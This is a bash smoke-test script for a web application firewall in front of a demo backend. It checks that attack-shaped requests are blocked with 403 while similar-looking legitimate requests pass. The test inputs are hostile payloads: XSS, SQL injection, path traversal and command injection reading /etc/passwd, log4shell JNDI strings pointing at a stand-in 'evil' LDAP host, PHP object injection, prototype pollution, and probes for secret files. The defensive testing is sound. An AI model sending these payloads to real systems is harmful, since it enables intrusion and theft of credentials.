#!/usr/bin/env bash
# WAF smoke tests: attacks must be blocked, ordinary traffic must not be.
#
#   ./scripts/smoke-test.sh [host]
#
# Needs a routed backend that answers 200 on ARBITRARY paths. The suite is half
# "attacks must 403" and half "ordinary traffic must not" - and the second half
# is the one that catches an over-aggressive rule. A real application cannot
# play that role: anything behind a login redirects unknown paths, so "the WAF
# allowed it" and "the app bounced it" become indistinguishable. That is what
# the demo whoami backend exists for:
#
#   make demo && make test && docker compose --profile demo down
#
# Hosts ending in .localhost are resolved to 127.0.0.1 automatically.
set -uo pipefail

HOST="${1:-whoami.localhost}"
CURL=(curl -sk -o /dev/null --max-time 20)
case "$HOST" in
  *.localhost|localhost) CURL+=(--resolve "$HOST:443:127.0.0.1" --resolve "$HOST:80:127.0.0.1") ;;
esac

pass=0; fail=0
check() { # name expected curl-args...
  local name="$1" want="$2"; shift 2
  local got; got=$("${CURL[@]}" -w '%{http_code}' "$@")
  if [[ "$got" == "$want" ]]; then
    printf '  \033[32mPASS\033[0m  %-38s %s\n' "$name" "$got"; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  %-38s %s (wanted %s)\n' "$name" "$got" "$want"; fail=$((fail+1))
  fi
}

# ---- Preflight -------------------------------------------------------------
# Every assertion below depends on reaching a routed backend. When that is not
# true the whole suite fails identically and says nothing useful, so diagnose it
# once, here. Note a 404 is NOT the WAF rejecting anything: with no matching
# router Traefik answers before the middleware chain runs, so the WAF is never
# invoked at all.
probe=$("${CURL[@]}" -w '%{http_code}' "https://$HOST/")
case "$probe" in
  000)
    echo "ERROR: cannot reach https://$HOST" >&2
    echo "  The gateway is not running, or the name does not resolve." >&2
    echo "  Start it with:  make up" >&2
    exit 2 ;;
  404)
    echo "ERROR: no router matches https://$HOST - Traefik returned 404." >&2
    echo "  Nothing is published at that hostname, so there is nothing to" >&2
    echo "  test: the WAF only runs on requests a router has matched." >&2
    # Two very different causes produce this 404, and the fix differs. Ask the
    # dashboard whether Traefik discovered ANY docker router: none at all means
    # the provider itself is broken, not that a backend is missing. Loopback
    # only, so this silently degrades to the common case from another machine.
    routers=$(curl -s --max-time 3 http://127.0.0.1:8085/api/http/routers 2>/dev/null)
    if [[ -n "$routers" && "$routers" != *"@docker"* ]]; then
      echo >&2
      echo "  Traefik has discovered NO docker routers at all, so a backend is" >&2
      echo "  not what you are missing - its docker provider is failing:" >&2
      echo "    docker compose logs traefik | grep -i 'provider error'" >&2
      echo "  On an enforcing SELinux host this is the unlabelled docker" >&2
      echo "  socket - see the SELinux note in the README." >&2
    else
      echo "  Start the demo backend:   make demo" >&2
      echo "  Or target a routed host:  ./scripts/smoke-test.sh app.example.com" >&2
    fi
    exit 2 ;;
  200) ;;
  *)
    echo "WARNING: https://$HOST/ returned $probe, expected 200." >&2
    echo "  The 'expect 200' tests need a backend that answers 200 on any" >&2
    echo "  path. A login redirect will fail them even though the WAF is" >&2
    echo "  behaving correctly. The 'expect 403' results are still valid." >&2
    echo >&2 ;;
esac

echo "Target: https://$HOST"
echo
echo "Attacks (expect 403)"
check "XSS script tag"        403 "https://$HOST/?q=<script>alert(1)</script>"
check "XSS event handler"     403 "https://$HOST/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
check "SQLi UNION"            403 "https://$HOST/?id=1%20UNION%20SELECT%20a%20FROM%20b"
check "SQLi boolean"          403 "https://$HOST/?id=1%27%20OR%20%271%27=%271"
check "path traversal"        403 "https://$HOST/?f=../../etc/passwd"
check "command injection"     403 "https://$HOST/?cmd=cat%20/etc/passwd;id"
check "log4shell in arg"      403 --get --data-urlencode 'x=${jndi:ldap://evil/a}' "https://$HOST/"
check "log4shell in header"   403 -H 'User-Agent: ${jndi:ldap://evil/a}' "https://$HOST/"
check "dotfile /.env"         403 "https://$HOST/.env"
check "VCS dir /.git/config"  403 "https://$HOST/.git/config"
check "backup file /db.sql"   403 "https://$HOST/db.sql"
check "manifest /package.json" 403 "https://$HOST/package.json"
check "status /server-status" 403 "https://$HOST/server-status"

echo
echo "App-stack rules - attacker paths (expect 403)"
check "PHP serialized object"  403 --get --data-urlencode 'u=O:8:"Exploit":1:{}' "https://$HOST/"
check "PHP /artisan"           403 "https://$HOST/artisan"
check "PHP /vendor/x.php"      403 "https://$HOST/vendor/autoload.php"
check "PHP /storage/x.log"     403 "https://$HOST/storage/laravel.log"
check "PHP /phpinfo.php"       403 "https://$HOST/phpinfo.php"
check "WP /wp-config.php"      403 "https://$HOST/wp-config.php"
check "WP /xmlrpc.php"         403 "https://$HOST/xmlrpc.php"
check "proto pollution __proto__" 403 --get --data-urlencode '__proto__[x]=1' "https://$HOST/"
check "proto pollution ctor"   403 --get --data-urlencode 'constructor[prototype][x]=1' "https://$HOST/"
check "node /node_modules/"    403 "https://$HOST/node_modules/lodash/index.js"
check "build dir /.next/"      403 "https://$HOST/.next/build-manifest.json"
check "java /actuator/env"     403 "https://$HOST/actuator/env"
check "java /WEB-INF/web.xml"  403 "https://$HOST/WEB-INF/web.xml"
check ".NET /elmah.axd"        403 "https://$HOST/elmah.axd"

echo
echo "App-stack rules - legitimate lookalikes (expect 200)"
check "Laravel storage:link file" 200 "https://$HOST/storage/photos/img.jpg"
check "vendored asset .css"    200 "https://$HOST/vendor/bootstrap/bootstrap.min.css"
check "Next.js asset /_next/"  200 "https://$HOST/_next/static/chunk.js"
check "WP admin login"         200 "https://$HOST/wp-login.php"
check "param named prototype"  200 --get --data-urlencode 'prototype=v2' "https://$HOST/"
check "param named constructor" 200 --get --data-urlencode 'constructor=acme' "https://$HOST/"
check "path /environment"      200 "https://$HOST/environment"
check "path /statuses"         200 "https://$HOST/statuses"
# Source maps are deliberately allowed - rule 1231 used to block them and
# 403'd Grafana's, which ships them under /public/ on purpose.
check "source map /app.js.map" 200 "https://$HOST/static/app.js.map"

echo
echo "Legitimate traffic (expect 200)"
check "clean GET"             200 "https://$HOST/"
check "PUT"                   200 -X PUT "https://$HOST/api/items/1"
check "PATCH"                 200 -X PATCH "https://$HOST/api/items/1"
check "DELETE"                200 -X DELETE "https://$HOST/api/items/1"
check "JSON POST with id"     200 -X POST -H 'Content-Type: application/json' \
                                  --data '{"id":42,"name":"test"}' "https://$HOST/api/items"
check "form POST, no CSRF hdr" 200 -X POST -d 'name=test' "https://$HOST/contact"
check "prose: 'operating system'" 200 --data-urlencode 'q=which operating system' "https://$HOST/search"
check "prose: 'wait..what'"   200 --data-urlencode 'm=wait..what' "https://$HOST/"
check "log line 'INFO:200:ok'" 200 --data-urlencode 'l=INFO:200:ok' "https://$HOST/"

echo
echo "Gateway behaviour"
check "HTTP -> HTTPS redirect" 301 "http://$HOST/"
check "CORS preflight answered" 200 -X OPTIONS \
      -H 'Origin: https://app.example.com' -H 'Access-Control-Request-Method: DELETE' \
      "https://$HOST/api/items/1"

# A WAF block must carry CORS headers, otherwise browsers report it as a
# phantom CORS failure instead of the real 403.
if curl -sk --max-time 20 \
     $( [[ "$HOST" == *.localhost ]] && echo "--resolve $HOST:443:127.0.0.1" ) \
     -i -H 'Origin: https://app.example.com' \
     "https://$HOST/?q=<script>alert(1)</script>" 2>/dev/null \
   | grep -qi 'access-control-allow-origin'; then
  printf '  \033[32mPASS\033[0m  %-38s %s\n' "403 carries CORS headers" "present"; pass=$((pass+1))
else
  printf '  \033[31mFAIL\033[0m  %-38s %s\n' "403 carries CORS headers" "MISSING"; fail=$((fail+1))
fi

echo
echo "-------------------------------------------"
printf 'passed: %d   failed: %d\n' "$pass" "$fail"
[[ $fail -eq 0 ]] || exit 1
